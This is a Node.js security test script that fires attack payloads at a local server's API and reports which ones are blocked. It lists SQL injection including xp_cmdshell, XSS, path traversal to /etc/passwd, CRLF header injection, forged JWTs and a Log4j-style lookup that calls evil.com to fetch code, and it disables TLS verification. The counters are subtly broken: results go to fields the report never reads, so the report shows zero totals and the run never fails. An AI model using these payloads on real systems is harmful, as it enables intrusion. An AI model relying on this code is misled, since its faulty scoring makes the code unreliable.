#!/usr/bin/env node
/**
 * Comprehensive Security Testing Suite
 * Tests middleware protection against various attack vectors
 */

const https = require('https');
const http = require('http');
const crypto = require('crypto');

class SecurityTester {
  constructor(baseUrl = 'http://localhost:3000') {
    this.baseUrl = baseUrl;
    this.results = {
      timestamp: new Date().toISOString(),
      summary: { total: 0, blocked: 0, passed: 0, failed: 0 },
      tests: [],
      vulnerabilities: [],
      recommendations: []
    };
    
    // Disable SSL verification for testing (DO NOT USE IN PRODUCTION)
    process.env["NODE_TLS_REJECT_UNAUTHORIZED"] = 0;
  }

  async runAllTests() {
    console.log('🔒 Starting Comprehensive Security Testing Suite...\n');
    
    try {
      // Run all test categories in parallel
      await Promise.all([
        this.testMaliciousCookies(),
        this.testSQLInjection(),
        this.testXSSPayloads(),
        this.testPathTraversal(),
        this.testCRLFInjection(),
        this.testCookieBoundaries(),
        this.testJWTAttacks(),
        this.testNullAndEmptyValues()
      ]);
      
      this.generateReport();
      return this.results;
    } catch (error) {
      console.error('❌ Security testing failed:', error);
      throw error;
    }
  }

  async makeRequest(options) {
    return new Promise((resolve) => {
      const protocol = options.protocol === 'https:' ? https : http;
      const startTime = Date.now();
      
      const req = protocol.request(options, (res) => {
        let body = '';
        res.on('data', chunk => body += chunk);
        res.on('end', () => {
          const responseTime = Date.now() - startTime;
          resolve({
            statusCode: res.statusCode,
            headers: res.headers,
            body: body,
            responseTime: responseTime,
            blocked: res.statusCode >= 400 && res.statusCode < 500
          });
        });
      });

      req.on('error', (error) => {
        resolve({
          statusCode: 0,
          error: error.message,
          blocked: true,
          responseTime: Date.now() - startTime
        });
      });

      if (options.body) {
        req.write(options.body);
      }
      req.end();
    });
  }

  logTest(category, payload, result, expected = 'blocked') {
    this.results.total++;
    const status = result.blocked ? 'BLOCKED' : 'PASSED';
    const isVulnerable = !result.blocked && expected === 'blocked';
    
    if (result.blocked) {
      this.results.blocked++;
    } else if (isVulnerable) {
      this.results.failed++;
      this.results.vulnerabilities.push({
        category,
        payload: payload.substring(0, 100) + '...',
        status: result.statusCode,
        risk: 'HIGH'
      });
    } else {
      this.results.passed++;
    }

    const emoji = result.blocked ? '🛡️' : (isVulnerable ? '⚠️' : '✅');
    console.log(`${emoji} [${category}] ${status} - ${payload.substring(0, 50)}...`);

    this.results.tests.push({
      category,
      payload: payload.substring(0, 200),
      status,
      statusCode: result.statusCode,
      responseTime: result.responseTime,
      vulnerable: isVulnerable
    });
  }

  async testMaliciousCookies() {
    console.log('🍪 Testing Malicious Cookie Payloads...');
    
    const maliciousCookies = [
      // Cookie injection attacks
      'sessionid=abc123; admin=true',
      'auth=valid; DROP TABLE users--',
      'token=<script>alert("xss")</script>',
      'session="../../../etc/passwd"',
      'auth=\r\nSet-Cookie: admin=true',
      'data=' + 'A'.repeat(10000), // Oversized cookie
      'session=\x00\x01\x02\xFF', // Binary data
      'auth=\';DROP TABLE sessions;--',
      'token=%27%20OR%201=1--',
      'session=${jndi:ldap://evil.com/exploit}', // Log4j style
    ];

    for (const cookie of maliciousCookies) {
      const response = await this.makeRequest({
        hostname: 'localhost',
        port: 3000,
        path: '/api/user/profile',
        method: 'GET',
        headers: {
          'Cookie': cookie,
          'User-Agent': 'SecurityTester/1.0'
        }
      });
      
      this.logTest('Malicious Cookies', cookie, response);
    }
  }

  async testSQLInjection() {
    console.log('💉 Testing SQL Injection in Cookies...');
    
    const sqlPayloads = [
      "' OR '1'='1",
      "'; DROP TABLE users; --",
      "' UNION SELECT password FROM users--",
      "admin'/*",
      "' OR 1=1#",
      "') OR ('1'='1",
      "' AND (SELECT SUBSTRING(@@version,1,1))='5'--",
      "' WAITFOR DELAY '00:00:05'--",
      "'; EXEC xp_cmdshell('dir')--",
      "' OR SLEEP(5)#"
    ];

    for (const payload of sqlPayloads) {
      const response = await this.makeRequest({
        hostname: 'localhost',
        port: 3000,
        path: '/api/auth/login',
        method: 'POST',
        headers: {
          'Cookie': `sessionid=${payload}`,
          'Content-Type': 'application/json',
          'User-Agent': 'SecurityTester/1.0'
        },
        body: JSON.stringify({ email: 'test@example.com', password: 'password' })
      });
      
      this.logTest('SQL Injection', payload, response);
    }
  }

  async testXSSPayloads() {
    console.log('🚨 Testing XSS Payloads in Authentication...');
    
    const xssPayloads = [
      '<script>alert("XSS")</script>',
      '<img src=x onerror=alert("XSS")>',
      'javascript:alert("XSS")',
      '<svg onload=alert("XSS")>',
      '"><script>alert("XSS")</script>',
      '<iframe src="javascript:alert(`XSS`)">',
      '<body onload=alert("XSS")>',
      '<input onfocus=alert("XSS") autofocus>',
      '<select onfocus=alert("XSS") autofocus>',
      '<video><source onerror="alert(`XSS`)">'
    ];

    for (const payload of xssPayloads) {
      const response = await this.makeRequest({
        hostname: 'localhost',
        port: 3000,
        path: '/api/user/profile',
        method: 'GET',
        headers: {
          'Authorization': `Bearer ${payload}`,
          'Cookie': `auth_token=${payload}`,
          'User-Agent': 'SecurityTester/1.0'
        }
      });
      
      this.logTest('XSS Payloads', payload, response);
    }
  }

  async testPathTraversal() {
    console.log('📁 Testing Path Traversal Attacks...');
    
    const pathTraversalPayloads = [
      '../../../etc/passwd',
      '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
      '....//....//....//etc/passwd',
      '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
      '..%252f..%252f..%252fetc%252fpasswd',
      '..%c0%af..%c0%af..%c0%afetc%c0%afpasswd',
      '/var/www/../../etc/passwd',
      '\\\\..\\\\..\\\\..\\\\etc\\\\passwd'
    ];

    for (const payload of pathTraversalPayloads) {
      const response = await this.makeRequest({
        hostname: 'localhost',
        port: 3000,
        path: `/api/files/${encodeURIComponent(payload)}`,
        method: 'GET',
        headers: {
          'Cookie': 'sessionid=valid_session',
          'User-Agent': 'SecurityTester/1.0'
        }
      });
      
      this.logTest('Path Traversal', payload, response);
    }
  }

  async testCRLFInjection() {
    console.log('📋 Testing CRLF Injection in Headers...');
    
    const crlfPayloads = [
      'value\r\nSet-Cookie: admin=true',
      'data\r\nLocation: http://evil.com',
      'session\r\n\r\n<script>alert("XSS")</script>',
      'token\r\nContent-Length: 0\r\n\r\nHTTP/1.1 200 OK',
      'auth\r\nX-Forwarded-For: 127.0.0.1',
      'id\rSet-Cookie: malicious=true',
      'value\nX-Accel-Redirect: /evil',
      'data\r\nTransfer-Encoding: chunked'
    ];

    for (const payload of crlfPayloads) {
      try {
        // Test CRLF in URL parameters instead of headers to avoid Node.js validation
        const encodedPayload = encodeURIComponent(payload);
        const response = await this.makeRequest({
          hostname: 'localhost',
          port: 3000,
          path: `/api/user/profile?session=${encodedPayload}`,
          method: 'GET',
          headers: {
            'User-Agent': 'SecurityTester/1.0'
          }
        });
        
        this.logTest('CRLF Injection', payload, response);
      } catch (error) {
        // If Node.js blocks the header, that's actually good security
        this.logTest('CRLF Injection', payload, { 
          blocked: true, 
          statusCode: 400, 
          error: 'Node.js header validation blocked request',
          responseTime: 0
        });
      }
    }
  }

  async testCookieBoundaries() {
    console.log('📏 Testing Cookie Length Boundaries...');
    
    const boundaryTests = [
      { name: '10 chars', value: 'A'.repeat(10) },
      { name: '11 chars', value: 'A'.repeat(11) },
      { name: '32 chars', value: 'A'.repeat(32) },
      { name: '33 chars', value: 'A'.repeat(33) },
      { name: '4KB cookie', value: 'A'.repeat(4096) },
      { name: '8KB cookie', value: 'A'.repeat(8192) },
      { name: 'Empty cookie', value: '' },
      { name: 'Single char', value: 'A' }
    ];

    for (const test of boundaryTests) {
      const response = await this.makeRequest({
        hostname: 'localhost',
        port: 3000,
        path: '/api/user/profile',
        method: 'GET',
        headers: {
          'Cookie': `sessionid=${test.value}`,
          'User-Agent': 'SecurityTester/1.0'
        }
      });
      
      // Boundary tests expect different behavior
      const expected = test.value.length === 0 || test.value.length > 4000 ? 'blocked' : 'allowed';
      this.logTest('Cookie Boundaries', test.name, response, expected);
    }
  }

  async testJWTAttacks() {
    console.log('🔑 Testing JWT Token Attacks...');
    
    const jwtAttacks = [
      // None algorithm attack
      'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTUxNjIzOTAyMn0.',
      // Invalid signature
      'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTUxNjIzOTAyMn0.invalid_signature',
      // Malformed JWT
      'not.a.valid.jwt.token',
      // Empty sections
      '..',
      // SQL in JWT payload
      'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiInIE9SICcxJz0nMSIsImlhdCI6MTUxNjIzOTAyMn0.signature',
      // XSS in JWT
      'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiI8c2NyaXB0PmFsZXJ0KCdYU1MnKTwvc2NyaXB0PiIsImlhdCI6MTUxNjIzOTAyMn0.signature'
    ];

    for (const token of jwtAttacks) {
      const response = await this.makeRequest({
        hostname: 'localhost',
        port: 3000,
        path: '/api/user/profile',
        method: 'GET',
        headers: {
          'Authorization': `Bearer ${token}`,
          'User-Agent': 'SecurityTester/1.0'
        }
      });
      
      this.logTest('JWT Attacks', token.substring(0, 50) + '...', response);
    }
  }

  async testNullAndEmptyValues() {
    console.log('⚪ Testing Null and Empty Values...');
    
    const nullTests = [
      { name: 'null string', value: 'null' },
      { name: 'undefined', value: 'undefined' },
      { name: 'empty string', value: '' },
      { name: 'whitespace only', value: '   ' },
      { name: 'null bytes', value: '\x00\x00\x00' },
      { name: 'unicode null', value: '\u0000' },
      { name: 'percent encoded null', value: '%00' }
    ];

    for (const test of nullTests) {
      const response = await this.makeRequest({
        hostname: 'localhost',
        port: 3000,
        path: '/api/user/profile',
        method: 'GET',
        headers: {
          'Cookie': `sessionid=${test.value}`,
          'Authorization': `Bearer ${test.value}`,
          'User-Agent': 'SecurityTester/1.0'
        }
      });
      
      this.logTest('Null/Empty Values', test.name, response);
    }
  }

  generateReport() {
    console.log('\n📊 Security Testing Report');
    console.log('=' .repeat(50));
    console.log(`Total Tests: ${this.results.summary.total}`);
    console.log(`🛡️  Blocked: ${this.results.summary.blocked}`);
    console.log(`✅ Passed: ${this.results.summary.passed}`);
    console.log(`❌ Failed: ${this.results.summary.failed}`);
    console.log(`🔒 Security Score: ${((this.results.summary.blocked / this.results.summary.total) * 100).toFixed(1)}%`);
    
    if (this.results.vulnerabilities.length > 0) {
      console.log('\n⚠️  VULNERABILITIES DETECTED:');
      this.results.vulnerabilities.forEach((vuln, i) => {
        console.log(`${i + 1}. [${vuln.category}] ${vuln.payload} - Status: ${vuln.status}`);
      });
    }

    // Generate recommendations
    this.generateRecommendations();
    
    if (this.results.recommendations.length > 0) {
      console.log('\n💡 SECURITY RECOMMENDATIONS:');
      this.results.recommendations.forEach((rec, i) => {
        console.log(`${i + 1}. ${rec}`);
      });
    }

    console.log('\n🔒 Security testing completed.');
  }

  generateRecommendations() {
    const vulnCategories = [...new Set(this.results.vulnerabilities.map(v => v.category))];
    
    if (vulnCategories.includes('SQL Injection')) {
      this.results.recommendations.push('Implement parameterized queries and input sanitization');
    }
    
    if (vulnCategories.includes('XSS Payloads')) {
      this.results.recommendations.push('Add Content Security Policy headers and output encoding');
    }
    
    if (vulnCategories.includes('Path Traversal')) {
      this.results.recommendations.push('Validate and sanitize file paths, use whitelist approach');
    }
    
    if (vulnCategories.includes('CRLF Injection')) {
      this.results.recommendations.push('Validate and sanitize HTTP headers, reject CRLF characters');
    }
    
    if (vulnCategories.includes('JWT Attacks')) {
      this.results.recommendations.push('Implement proper JWT validation and signature verification');
    }
    
    if (this.results.summary.failed > 0) {
      this.results.recommendations.push('Review and strengthen input validation middleware');
      this.results.recommendations.push('Implement rate limiting and request size limits');
      this.results.recommendations.push('Add comprehensive logging for security events');
    }
  }
}

// Export for use in other modules
module.exports = SecurityTester;

// Run tests if called directly
if (require.main === module) {
  const tester = new SecurityTester();
  
  tester.runAllTests()
    .then(results => {
      console.log('\n✅ All security tests completed');
      process.exit(results.summary.failed > 0 ? 1 : 0);
    })
    .catch(error => {
      console.error('❌ Security testing failed:', error);
      process.exit(1);
    });
}